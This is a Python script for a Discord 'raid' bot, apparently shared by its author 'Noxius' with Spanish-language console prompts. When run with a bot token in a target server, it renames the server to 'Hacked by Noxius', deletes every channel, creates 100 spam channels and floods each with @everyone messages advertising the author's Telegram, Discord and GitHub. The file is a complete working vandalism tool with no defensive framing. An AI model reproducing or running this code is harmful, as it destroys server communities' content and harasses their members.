import os

import discord
from discord.ext import commands
import asyncio
import fade
import requests

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)
os.system("title Noxius Discord Raid ^| Made by @noximora.")
IMAGE_URL = "https://media.discordapp.net/attachments/1486477330972151819/1489996779733909737/logo.png?ex=69d27323&is=69d121a3&hm=859ba76acc6115fb026991934ecc7d0a412cb4fa104a61adc8c6ca5f692e7104&=&format=webp&quality=lossless&width=1296&height=864"
NUM_CANALES = 100

gui = r"""

     /$$   /$$  /$$$$$$  /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$
    | $$$ | $$ /$$__  $$| $$  / $$|_  $$_/| $$  | $$ /$$__  $$
    | $$$$| $$| $$  \ $$|  $$/ $$/  | $$  | $$  | $$| $$  \__/
    | $$ $$ $$| $$  | $$ \  $$$$/   | $$  | $$  | $$|  $$$$$$
    | $$  $$$$| $$  | $$  >$$  $$   | $$  | $$  | $$ \____  $$
    | $$\  $$$| $$  | $$ /$$/\  $$  | $$  | $$  | $$ /$$  \ $$
    | $$ \  $$|  $$$$$$/| $$  \ $$ /$$$$$$|  $$$$$$/|  $$$$$$/
    |__/  \__/ \______/ |__/  |__/|______/ \______/  \______/

"""


@bot.event
async def on_ready():
    faded_gui = fade.pinkred(gui)
    os.system("cls")
    print(faded_gui)
    print(fade.pinkred("Raid Bot Ready - Made by Noxius (t.me/noxiustudio)"))
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game("t.me/noxiustudio")
    )
    guild_id_input = input(fade.pinkred("Introduce la ID del servidor: "))

    try:
        guild_id = int(guild_id_input)
    except:
        print(fade.pinkred("ID no válida"))
        return

    guild = bot.get_guild(guild_id)

    if guild is None:
        print(fade.pinkred("No se encontró el servidor."))
        return

    try:
        print(fade.pinkred("\nSe esta raidendo el servidor..."))
        response = requests.get(IMAGE_URL)
        if response.status_code == 200:
            await guild.edit(name="Hacked by Noxius (t.me/noxiustudio)", icon=response.content)
    except:
        pass

    for channel in guild.channels:
        await channel.delete()
    for i in range(NUM_CANALES):
        try:
            channel = await guild.create_text_channel(f"hacked-by-noxius")

            await channel.send("## HACKED BY NOXIUS 🧪 \n - https://discord.gg/knuy3VxGQS \n - https://t.me/noxiustudio \n - https://github.com/noximora \n \n *Made by `@noximora.`* \n \n @everyone")
            await channel.send("## HACKED BY NOXIUS 🧪 \n - https://discord.gg/knuy3VxGQS \n - https://t.me/noxiustudio \n - https://github.com/noximora \n \n *Made by `@noximora.`* \n \n @everyone")
            await channel.send("## HACKED BY NOXIUS 🧪 \n - https://discord.gg/knuy3VxGQS \n - https://t.me/noxiustudio \n - https://github.com/noximora \n \n *Made by `@noximora.`* \n \n @everyone")
        except:
            pass

    print(fade.greenblue("Raid completado!"))


bot.run("TOKEN BOT")
